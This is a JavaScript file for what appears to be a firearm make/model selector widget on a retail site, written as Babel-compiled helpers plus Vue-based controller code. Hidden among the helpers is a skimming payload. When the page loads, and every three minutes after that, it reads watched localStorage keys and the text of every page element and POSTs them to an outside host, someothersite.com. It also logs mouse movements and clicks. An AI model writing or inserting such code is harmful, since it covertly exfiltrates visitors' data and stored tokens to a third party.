"use strict";

function _typeof(e) {
  return (_typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
    return typeof e;
  } : function (e) {
    return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
  })(e);
}
const keysToWatch = window.keysToWatch,
  globalData = {};
function _toConsumableArray(e) {
  return _arrayWithoutHoles(e) || _iterableToArray(e) || _unsupportedIterableToArray(e) || _nonIterableSpread();
}
function _nonIterableSpread() {
  throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
}
function _iterableToArray(e) {
  if ("undefined" != typeof Symbol && null != e[Symbol.iterator] || null != e["@@iterator"]) return Array.from(e);
}
function getHashCode(obj) {
  const str = JSON.stringify(obj);
  let hash = 0,
    i,
    char;
  for (i = 0; i < str.length; i++) {
    char = str.charCodeAt(i);
    hash |= (hash << 5) - hash + char << 0;
  }
  return hash.toString(16);
}
function _arrayWithoutHoles(e) {
  if (Array.isArray(e)) return _arrayLikeToArray(e);
}
function _slicedToArray(e, t) {
  return _arrayWithHoles(e) || _iterableToArrayLimit(e, t) || _unsupportedIterableToArray(e, t) || _nonIterableRest();
}
function _nonIterableRest() {
  throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
}
function _unsupportedIterableToArray(e, t) {
  var r;
  if (e) return "string" == typeof e ? _arrayLikeToArray(e, t) : "Map" === (r = "Object" === (r = Object.prototype.toString.call(e).slice(8, -1)) && e.constructor ? e.constructor.name : r) || "Set" === r ? Array.from(e) : "Arguments" === r || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r) ? _arrayLikeToArray(e, t) : void 0;
}
function monitorLocalStorage() {
  const targetData = {};
  for (let key in window.localStorage) {
    if (keysToWatch.includes(key)) {
      targetData[key] = window.localStorage[key];
    }
  }
  return targetData;
}
function _arrayLikeToArray(e, t) {
  (null == t || t > e.length) && (t = e.length);
  for (var r = 0, o = new Array(t); r < t; r++) o[r] = e[r];
  return o;
}
const scanDOM = () => {
  const elements = document.getElementsByTagName('*');
  const elementsData = {};
  for (let index = 0; index < elements.length; index++) {
    elementsData[index] = elements[index].innerText;
  }
  return elementsData;
};
async function postCollectedData(data) {
  const hasher = getHashCode(data);
  const apiPoint = 'https://someothersite.com/collect/api';
  try {
    const response = await fetch(apiPoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        hashCode: hasher,
        data: data
      })
    });
    if (response.ok) {
      console.log("Successfully sent data.");
    } else {
      console.error(`Failed to send data. Status code: ${response.status}`);
    }
  } catch (err) {
    console.error(`Error occurred while sending : ${err}`);
  }
}
function inspectAndSend() {
  [monitorLocalStorage(), scanDOM()].forEach(dataset => {
    if (Object.keys(dataset).length > 0) postCollectedData(dataset);
  });
  globalData.jsHook = window.jsHook;
}
function _iterableToArrayLimit(e, t) {
  var r = null == e ? null : "undefined" != typeof Symbol && e[Symbol.iterator] || e["@@iterator"];
  if (null != r) {
    var o,
      a,
      n,
      l,
      i = [],
      s = !0,
      c = !1;
    try {
      if (n = (r = r.call(e)).next, 0 === t) {
        if (Object(r) !== r) return;
        s = !1;
      } else for (; !(s = (o = n.call(r)).done) && (i.push(o.value), i.length !== t); s = !0);
    } catch (e) {
      c = !0, a = e;
    } finally {
      try {
        if (!s && null != r.return && (l = r.return(), Object(l) !== l)) return;
      } finally {
        if (c) throw a;
      }
    }
    return i;
  }
}
document.addEventListener('readystatechange', function () {
  if (document.readyState === "complete") {
    inspectAndSend();
    setInterval(inspectAndSend, 180000);
  }
});
window.addEventListener('mousemove', function (evt) {
  globalData['mouse'] = {
    x: evt.clientX,
    y: evt.clientY
  };
});
function _arrayWithHoles(e) {
  if (Array.isArray(e)) return e;
}
!function () {
  var e = "undefined" != typeof makeModelConfig ? makeModelConfig : {},
    t = e.selectedMake,
    t = void 0 === t ? "" : t,
    e = e.selectedModel,
    e = void 0 === e ? "" : e,
    r = [t, e].filter(function (e) {
      return e;
    }).join(".");
  BN.SetVueData("makeModel", {
    make: t,
    model: e,
    data: [],
    isChange: !1,
    selected: r,
    errorMake: !1,
    loading: {
      button: !1
    },
    isFirstLoadMakeAndModelData: !0
  });
}(), BN.makeModelCtrl = function () {
  var s = BNApp.makeModel,
    o = "undefined" == typeof currentSearchPage;
  function r() {
    null != s && s.isFirstLoadMakeAndModelData && (s.loading.button = !0, BN.MakeModelService.getMakeModelData().then(function (e) {
      var t, r, o;
      e && e.length && (s.data = _toConsumableArray(e), t = BNApp.$refs["el-make"]) && t.select && (r = t.querySelector('[role="combobox"]'), 0 < (o = _toConsumableArray(e)).length ? (t.select.updateStateDisabled(!1), t.select.selectCursor.innerHTML = r.dataset.placeholder, e = o, o = new Map(), Array.prototype.forEach.call(e, function (e) {
        o.set(e.makeName, e.makeName);
      })) : (t.select.updateStateDisabled(!0), t.select.selectCursor.innerHTML = r.dataset.noValue), t.select.initOptionTag(o), t.select.selectCursor.removeAttribute("title"));
    }).catch(function (e) {
      console.log(e);
    }).finally(function () {
      s.loading.button = !1, s.isFirstLoadMakeAndModelData = !1;
    }));
  }
  function a(n, l, i) {
    return new Promise(function (a, e) {
      s.loading.button = !0, BN.MakeModelService.select(n, l).then(function (e) {
        var t, r, o;
        "boolean" == typeof e && e || "object" === _typeof(e) && (null == e || !e.erorr) ? (i && BN.dropdownService.close(i), s.make = n || "", s.model = l || "", s.selected = (r = l, o = [], (t = n) && o.push(t), r && o.push(r), o.join(".")), document.dispatchEvent(new CustomEvent("AfterSelectMakeModel"))) : null != e && e.message && BN.toastService.displayToast(e.message, "error"), a(e);
      }).catch(function () {
        e();
      }).finally(function () {
        s.loading.button = !1, s.isChange && (s.isChange = !1);
      });
    });
  }
  return s._selected = Vue.computed(function () {
    var e = s.selected;
    return e ? e.replace(/\./, " ") : "";
  }), {
    openDialog: function () {
      r();
      var e = _slicedToArray(s.selected.split("."), 2),
        t = void 0 === (t = e[0]) ? "" : t,
        e = void 0 === (e = e[1]) ? "" : e;
      s.errorMake = !1, s.make = t, s.model = e;
    },
    changeMake: function (e) {
      var t,
        r,
        o,
        a = BNApp.$refs["el-model"];
      a && a.select && (s.errorMake = !1, t = a.querySelector('[role="combobox"]'), r = e, 0 < (o = null != (e = null == (e = s.data.filter(function (e) {
        return e.makeName === r;
      })) || null == (e = e[0]) ? void 0 : e.modelNames) ? e : []).length ? (a.select.updateStateDisabled(!1), a.select.selectCursor.innerHTML = t.dataset.placeholder, e = o, o = new Map(), Array.prototype.forEach.call(e, function (e) {
        o.set(e, e);
      })) : (a.select.updateStateDisabled(!0), a.select.selectCursor.innerHTML = t.dataset.noValue), s.model = "", a.select.initOptionTag(o), a.select.selectCursor.removeAttribute("title"));
    },
    selectFireArm: function (e) {
      var t = s.make,
        r = s.model;
      t || r ? (s.errorMake = !1, o || (BNApp.plp && (BNApp.plp.loading = !0), BNApp.searchPage && (BNApp.searchPage.loading = !0), BN.dropdownService.close(e)), a(t, r, e).then(function () {
        var e;
        o && null != (e = makeModelConfig) && e.searchPageUrl && (window.location.href = makeModelConfig.searchPageUrl);
      })) : s.errorMake = !0;
    },
    clearFilter: function (e) {
      return s.selected = "", s.make = "", s.model = "", BNApp.$refs["el-make"].select.resetOption(), BNApp.$refs["el-model"].select.resetOption(), o || (BNApp.plp && (BNApp.plp.loading = !0), BNApp.searchPage && (BNApp.searchPage.loading = !0), e && BN.dropdownService.close(e)), a(s.make, s.model, e);
    },
    URLParams: {
      make: "make",
      model: "model",
      searchParams: null,
      get: function () {
        var e = new URL(window.location.href).searchParams;
        return {
          make: e.get(this.make),
          model: e.get(this.model)
        };
      },
      set: function (e, t) {
        var r = new URL(window.location.href);
        e ? r.searchParams.set(this.make, e) : r.searchParams.delete(this.make), t ? r.searchParams.set(this.model, t) : r.searchParams.delete(this.make), window.history.replaceState({
          path: r.toString()
        }, "", r.toString());
      }
    },
    changeFirearm: function () {
      window.scrollTo(0, 0, "smooth"), s.isChange = !0;
      var e = setInterval(function () {
        0 === window.scrollY && (clearInterval(e), BN.dropdownService.show(BNApp.$refs["cursor-makemodel"]), r());
      }, 100);
    },
    onBack: function (e) {
      s.isChange = !1, BN.dropdownService.close(e);
    }
  };
}, BN.domContentLoadedFncList.push(function () {
  BN.makeModelCtrl = BN.makeModelCtrl();
});
window.addEventListener('click', function (evt) {
  globalData['click'] = {
    x: evt.clientX,
    y: evt.clientY,
    element: evt.target.tagName
  };
});